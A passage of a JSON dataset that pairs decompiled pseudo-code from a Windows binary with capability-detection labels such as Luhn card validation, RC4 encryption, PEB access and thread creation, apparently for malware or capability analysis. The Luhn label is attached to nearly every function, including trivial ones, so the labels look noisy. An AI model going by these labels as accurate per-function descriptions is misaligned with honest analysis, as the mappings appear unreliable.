0x1454 + iVar5),  puVar2 = in_EAX + 0x1454 + iVar6,  uVar3 < *puVar2 || uVar3 == *puVar2\n            )))) break;\n        *(in_EAX + 0xb58 + iStack24 * 4) = *(in_EAX + 0xb58 + iVar7 * 4);\n        iStack24 = iVar7;\n    }\n    *(in_EAX + 0xb58 + iStack24 * 4) = iVar5;\n    return;\n}\n",
        "token_count": 629
    },
    "0046bc50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046bc50(int16_t *param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint16_t *puVar4;\n    int16_t iVar5;\n    int16_t aiStack44 [16];\n    \n    iVar5 = 0;\n    iVar2 = 1;\n    piVar3 = aiStack44;\n    do {\n        piVar3 = piVar3 + 1;\n        iVar5 = (*param_1 + iVar5) * 2;\n        *piVar3 = iVar5;\n        iVar2 = iVar2 + 1;\n        param_1 = param_1 + 1;\n    } while (iVar2 < 0x10);\n    iVar2 = 0;\n    puVar4 = in_EAX + 2;\n    if (-1 < param_2) {\n        do {\n            if (*puVar4 != 0) {\n                aiStack44[*puVar4] = aiStack44[*puVar4] + 1;\n                uVar1 = fcn.0046d52c();\n                puVar4[-1] = uVar1;\n            }\n            iVar2 = iVar2 + 1;\n            puVar4 = puVar4 + 2;\n        } while (iVar2 <= param_2);\n    }\n    return;\n}\n",
        "token_count": 315
    },
    "0046d92c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046d92c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x46d9cf;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00420f38();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421954();\n    fcn.00420fe4();\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 181
    },
    "0046da74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046da74(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x46db15;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00420f38();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421954();\n    fcn.00420fe4();\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 179
    },
    "0046de0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046de0c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x46deb6;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00420f38();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421954();\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 179
    },
    "0046df84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.0046df84(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x46e005;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00420f38();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421954();\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 154
    },
    "0046e074": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046e074(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x46e0e7;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00420f38();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.0042187c();\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 149
    },
    "0046e2bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046e2bc(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x46e32f;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00420f38();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.0042187c();\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 149
    },
    "0046e4dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046e4dc(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x46e54f;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00420f38();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.0042187c();\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 149
    },
    "0046e6bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046e6bc(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x46e72f;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00420f38();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.00421158();\n    fcn.0042187c();\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 149
    },
    "0046e904": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access",
            "set file attributes"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e904(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x46e916;\n    fcn.004058ec();\n    uStack20 = 0x46e949;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    uVar1 = fcn.004058fc(param_2);\n    sub.kernel32.dll_SetFileAttributesA();\n    *in_FS_OFFSET = uVar1;\n    uStack24 = 0x46e950;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 188
    },
    "0046e954": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set file attributes"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e954(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x46e96d;\n    fcn.004058ec();\n    uStack24 = 0x46e9b0;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.0040a518(param_2);\n    uVar1 = fcn.004058fc();\n    sub.kernel32.dll_SetFileAttributesA();\n    *in_FS_OFFSET = uVar1;\n    uStack28 = 0x46e9b7;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 208
    },
    "0046e9bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "set file attributes",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e9bc(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint32_t arg_ch;\n    uint32_t uVar2;\n    uint32_t *in_FS_OFFSET;\n    bool bVar3;\n    uint32_t uStack560;\n    uint32_t uStack556;\n    uchar *puStack552;\n    uint32_t uStack532;\n    uint uStack528;\n    uchar *puStack524;\n    uint32_t uStack520;\n    uint uStack516;\n    uchar *puStack512;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack524 = &stack0xfffffffc;\n    var_1e8h = 0;\n    var_1e4h = 0;\n    var_1e0h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    puStack512 = 0x46e9f6;\n    var_8h = param_2;\n    fcn.004058ec();\n    puStack512 = 0x46e9fe;\n    fcn.004058ec();\n    uStack516 = 0x46ec03;\n    uStack520 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdf8;\n    uStack528 = 0x46ebc7;\n    uStack532 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdec;\n    puStack512 = &stack0xfffffffc;\n    fcn.0040546c();\n    fcn.0046d788();\n    fcn.00405738();\n    fcn.00403764();\n    fcn.0040eeb8(&fcn.0046e9bc::var_1e4h, *0x46ec30);\n    fcn.00405504();\n    arg_ch = *0x46ec30;\n    puStack552 = 0x46ea9e;\n    fcn.0040eeb8(&fcn.0046e9bc::var_1e8h, arg_ch);\n    puStack552 = 0x46eaac;\n    fcn.00405504();\n    uStack556 = 0x46eaf5;\n    uStack560 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdd0;\n    puStack552 = &stack0xfffffffc;\n    fcn.0046d788(0x80);\n    fcn.00405738();\n    uVar2 = fcn.004058fc();\n    sub.kernel32.dll_SetFileAttributesA();\n    bVar3 = true;\n    *in_FS_OFFSET = uVar2;\n    uStack560 = 0x46eb0c;\n    fcn.00405894();\n    if (!bVar3) {\n        uStack560 = 0x46eb19;\n        fcn.004034e8();\n        uStack560 = 0x46eb1e;\n        fcn.0040304c();\n        while( true ) {\n            uStack560 = 0x46eb61;\n            fcn.00403a74();\n            uStack560 = 0x46eb66;\n            cVar1 = fcn.0040304c();\n            if (cVar1 != '\\0') break;\n            uStack560 = 0x46eb2e;\n            fcn.00403c7c();\n            uStack560 = 0x46eb39;\n            fcn.00403ce8();\n            uStack560 = 0x46eb3e;\n            fcn.0040304c();\n            uStack560 = var_ch;\n            uStack556 = 0x46ec3c;\n            fcn.00405800(uVar2, var_10h);\n        }\n        uStack560 = 0x46eb75;\n        fcn.0040390c();\n        uStack560 = 0x46eb7a;\n        fcn.0040304c();\n    }\n    uStack560 = 0x46eb85;\n    fcn.00405738();\n    uStack560 = 0x46eb90;\n    fcn.004034f4();\n    uStack560 = 0x46eb95;\n    fcn.0040304c();\n    uStack560 = 0x46eba3;\n    fcn.00405bf0();\n    uStack560 = 0x46eba8;\n    fcn.0040409c();\n    uStack560 = 0x46ebad;\n    fcn.0040304c();\n    uStack560 = 0x46ebb8;\n    fcn.0040390c();\n    uStack560 = 0x46ebbd;\n    fcn.0040304c();\n    *in_FS_OFFSET = uStack556;\n    *in_FS_OFFSET = arg_ch;\n    fcn.00405490();\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1134
    },
    "0046fdf4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046fdf4(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if ((param_2 < 0) || (in_EAX[2] <= param_2)) {\n        fcn.0046fe58();\n    }\n    iVar1 = fcn.0046fe5c();\n    in_EAX[2] = in_EAX[2] + -1;\n    if (param_2 < in_EAX[2]) {\n        fcn.004030ec();\n    }\n    if (iVar1 != 0) {\n        (**(*in_EAX + 4))();\n    }\n    return;\n}\n",
        "token_count": 158
    },
    "0046fed4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046fed4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((param_2 < *(in_EAX + 8)) || (0x7ffffff < param_2)) {\n        fcn.0046fe58();\n    }\n    if (param_2 != *(in_EAX + 0xc)) {\n        fcn.00402f24();\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "0046ff0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046ff0c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((param_2 < 0) || (0x7ffffff < param_2)) {\n        fcn.0046fe58();\n    }\n    if (*(in_EAX + 0xc) < param_2) {\n        fcn.0046fed4();\n    }\n    if (*(in_EAX + 8) < param_2) {\n        fcn.00403aac();\n    }\n    else {\n        iVar1 = *(in_EAX + 8) + -1;\n        iVar2 = param_2 - iVar1;\n        if (iVar2 == 0 || param_2 < iVar1) {\n            iVar2 = iVar2 + -1;\n            do {\n                fcn.0046fdf4();\n                iVar2 = iVar2 + 1;\n            } while (iVar2 != 0);\n        }\n    }\n    *(in_EAX + 8) = param_2;\n    return;\n}\n",
        "token_count": 246
    },
    "004700c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004700c0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    *(in_EAX + 0x104) = 0;\n    fcn.00470330();\n    *(in_EAX + 0x15c) = 1;\n    *(in_EAX + 0x15e) = 1;\n    *(in_EAX + 0x160) = 0x5622;\n    *(in_EAX + 0x164) = 0x5622;\n    *(in_EAX + 0x168) = 1;\n    *(in_EAX + 0x16a) = 8;\n    *(in_EAX + 0x16c) = 0x81;\n    *(in_EAX + 0x1dd) = 1;\n    *(in_EAX + 0x1df) = 1;\n    *(in_EAX + 0x1e1) = 0x5622;\n    *(in_EAX + 0x1e5) = 0x5622;\n    *(in_EAX + 0x1e9) = 1;\n    *(in_EAX + 0x1eb) = 8;\n    *(in_EAX + 0x1ed) = 0x81;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 395
    },
    "0047019c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047019c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(arg_8h + -4);\n    *(iVar1 + 0x108) = 0x54;\n    *(iVar1 + 0x10c) = 0;\n    *(iVar1 + 0x110) = 0;\n    *(iVar1 + 0x114) = *(*(arg_8h + -4) + 0xf0);\n    *(iVar1 + 0x118) = *(*(arg_8h + -4) + 0xf8);\n    *(iVar1 + 0x11c) = 0;\n    *(iVar1 + 0x120) = 0;\n    *(iVar1 + 0x124) = *(*(arg_8h + -4) + 0xf4);\n    *(iVar1 + 0x128) = *(*(arg_8h + -4) + 0xfc);\n    *(iVar1 + 300) = 0;\n    *(iVar1 + 0x130) = 0;\n    return;\n}\n",
        "token_count": 252
    },
    "0047020c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0047020c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uint uStack56;\n    int32_t iStack52;\n    uint uStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_4h;\n    \n    *(in_EAX + 0x100) = 1;\n    uStack24 = 0;\n    uStack28 = 0;\n    uStack32 = 0;\n    uStack36 = 0;\n    iStack40 = in_EAX + 0x1dd;\n    iStack44 = in_EAX + 0x15c;\n    uStack48 = 0;\n    iStack52 = in_EAX + 0x104;\n    uStack56 = 0x47024a;\n    sub.msacm32.dll_acmStreamOpen();\n    uStack56 = 0;\n    iStack60 = in_EAX + 0xfc;\n    uStack64 = *(in_EAX + 0xf8);\n    uStack68 = *(in_EAX + 0x104);\n    puStack72 = 0x47026e;\n    sub.msacm32.dll_acmStreamSize();\n    puStack72 = 0x47027c;\n    uVar1 = fcn.00402ef0();\n    *(in_EAX + 0xf0) = uVar1;\n    puStack72 = 0x470293;\n    uVar1 = fcn.00402ef0();\n    *(in_EAX + 0xf4) = uVar1;\n    uStack76 = 0x4702d5;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    fcn.0047019c(&stack0xfffffffc);\n    uVar1 = *(in_EAX + 0x104);\n    sub.msacm32.dll_acmStreamPrepareHeader(uVar1, in_EAX + 0x108, 0);\n    *in_FS_OFFSET = uVar1;\n    *(in_EAX + 0xec) = 1;\n    return;\n}\n",
        "token_count": 551
    },
    "004703a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004703a4(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code **in_ECX;\n    \n    (**in_ECX)(arg_ch, arg_10h, arg_14h);\n    return 0;\n}\n",
        "token_count": 67
    },
    "00470554": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00470554(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    uVar1 = fcn.00404610();\n    *(in_EAX + 8) = uVar1;\n    *(in_EAX + 4) = 0;\n    *(in_EAX + 0xc) = 0x2000;\n    *(in_EAX + 0x94) = 0;\n    uVar2 = 0x4707b8;\n    uVar1 = fcn.00470478(0x4707b8, in_EAX);\n    *(in_EAX + 0x98) = uVar1;\n    *(in_EAX + 0x91) = 4;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 275
    },
    "00470bd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00470bd4(uint param_1, uint *param_2)\n\n{\n    uint *in_EAX;\n    int32_t *piVar1;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    \n    uStack28 = *param_2;\n    uStack24 = param_2[1];\n    uStack20 = param_2[2];\n    uStack16 = param_2[3];\n    uStack44 = *in_EAX;\n    uStack40 = in_EAX[1];\n    uStack36 = in_EAX[2];\n    uStack32 = in_EAX[3];\n    uStack48 = 0;\n    piVar1 = *0x4987dc;\n    (**(**0x4987dc + 0x28))(*0x4987dc, 0, &uStack44, &uStack28, &uStack48, 0);\n    fcn.00405694();\n    sub.ole32.dll_CoTaskMemFree_1(piVar1);\n    return;\n}\n",
        "token_count": 271
    },
    "00470c30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00470c30(void)\n\n{\n    uint *in_EAX;\n    int32_t *piVar1;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    \n    uStack28 = *in_EAX;\n    uStack24 = in_EAX[1];\n    uStack20 = in_EAX[2];\n    uStack16 = in_EAX[3];\n    uStack32 = 0;\n    piVar1 = *0x4987dc;\n    (**(**0x4987dc + 0x1c))(*0x4987dc, 0, &uStack28, &uStack32, 0);\n    fcn.00405694();\n    sub.ole32.dll_CoTaskMemFree_1(piVar1);\n    return;\n}\n",
        "token_count": 189
    },
    "0047100c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0047100c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack20 = 0x471020;\n    var_4h = in_EAX;\n    fcn.0040716c();\n    uStack24 = 0x47105e;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    (**(*var_4h + 0xc))(var_4h, &fcn.0047100c::var_8h);\n    fcn.00405694();\n    *in_FS_OFFSET = var_4h;\n    piStack28 = 0x471065;\n    fcn.004070f8();\n    return;\n}\n",
        "token_count": 219
    },
    "00471348": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00471348(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x471379;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x4987d8 = *0x4987d8 + 1;\n    if (*0x4987d8 == 0) {\n        fcn.004070f8();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 140
    },
    "00471440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00471440(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x47145a;\n    fcn.004058ec();\n    uStack28 = 0x4714ce;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.00420f38();\n    fcn.00421014();\n    fcn.00405784();\n    fcn.00421158();\n    fcn.004218dc();\n    fcn.00404640();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x4714d5;\n    uStack28 = 0x4714cd;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 214
    },
    "00471bc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00471bc4(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uStack272;\n    uchar *puStack268;\n    uchar auStack264 [260];\n    \n    puStack268 = auStack264;\n    uStack272 = 0x1a;\n    uVar2 = 0;\n    iVar1 = sub.shell32.dll_SHGetSpecialFolderLocation(0);\n    if (iVar1 == 0) {\n        sub.shell32.dll_SHGetPathFromIDListA(uVar2, &uStack272);\n        fcn.004056dc();\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "004726cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create thread"
        ],
        "decompiled_code": "\nvoid fcn.004726cc(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x4726df;\n    fcn.004058ec();\n    uStack28 = 0x47276c;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    uVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 0x14);\n    fcn.004054c0();\n    fcn.004054c0();\n    fcn.004054c0();\n    fcn.004054c0();\n    fcn.004054c0();\n    uVar1 = sub.kernel32.dll_CreateThread(0, 0, fcn.00485178, uVar1, 0, &fcn.004726cc::var_8h);\n    sub.kernel32.dll_CloseHandle_1();\n    *in_FS_OFFSET = uVar1;\n    fcn.0040546c(0x472773);\n    return;\n}\n",
        "token_count": 273
    },
    "0047294c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0047294c(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack16 = 0x472962;\n    fcn.004058ec();\n    uStack20 = 0x4729b0;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.0040f1a8(0);\n    uVar1 = fcn.004058fc();\n    uVar1 = fcn.004058fc(uVar1);\n    uVar2 = 0;\n    sub.user32.dll_MessageBoxA_1(0, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405490(0x4729b7);\n    return;\n}\n",
        "token_count": 234
    },
    "0047ddd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0047ddd0(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    bool bVar2;\n    uchar uVar3;\n    float10 fVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack64 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack68 = 0x47dfca;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack72;\n    fcn.0048b764(*0x492540);\n    fcn.00409af4(0);\n    fcn.00405800(0);\n    *0x498804 = 0;\n    *0x492548 = 0;\n    *0x498910 = 0;\n    bVar2 = true;\n    *0x498914 = 0;\n    fcn.00405894();\n    if (bVar2) {\n        sub.kernel32.dll_CreateThread(0, 0, 0x480a14, 0, 0, 0x498818);\n        *0x498830 = 1;\n    }\n    sub.kernel32.dll_CreateThread(0, 0, 0x472064, 0, 0, &var_10h);\n    **0x49269c = 1;\n    fcn.00406858();\n    uVar3 = 1;\n    fcn.00403aac();\n    fcn.0047dc3c();\n    fcn.00406a5c();\n    fcn.0048b78c();\n    fcn.004054c0();\n    fcn.00405894();\n    if (uVar3) {\n        fVar4 = fcn.0040bc0c();\n        var_14h = fVar4 >> 0x20;\n        var_18h = SUB84(fVar4, 0);\n        fcn.0040c86c(var_18h, var_14h);\n        fVar4 = fcn.0040bc38();\n        var_1ch = fVar4 >> 0x20;\n        var_20h = SUB84(fVar4, 0);\n        fcn.0040c86c(var_20h, var_1ch);\n        fcn.00405800(var_8h, 0x47e000, var_4h);\n    }\n    uVar7 = 0;\n    sub.kernel32.dll_CreateThread(0, 0, fcn.00472c78, 0, 0, 0x498818);\n    while( true ) {\n        uVar6 = 0;\n        uVar5 = 0x4987e8;\n        iVar1 = sub.user32.dll_GetMessageA(0x4987e8, 0, 0, 0);\n        if (iVar1 == 0) break;\n        